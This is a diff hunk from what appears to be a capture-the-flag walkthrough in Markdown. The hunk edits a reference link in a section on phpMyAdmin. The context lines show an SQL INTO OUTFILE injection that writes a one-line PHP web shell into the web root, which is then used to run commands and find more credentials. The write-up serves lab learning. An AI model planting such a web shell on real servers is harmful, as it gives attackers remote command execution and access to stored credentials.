@@ -146,7 +146,8 @@ Best regards.
 # 5 - /phpmyadmin
 
 On the SQL Tab, we can inject some sql code.  
-<!-- https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/ -->
+// https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/  
+
 By injecting `SELECT "<?php system($_GET['cmd']);?>" into outfile "/var/www/forum/templates_c/fichier.php"`, we can create a command shell vulnerability inside the web server.  
 System() executes an external program and display the output on the php page.  
 By doing some `ls` we find an interesting path, which displays another pair of credentials.  
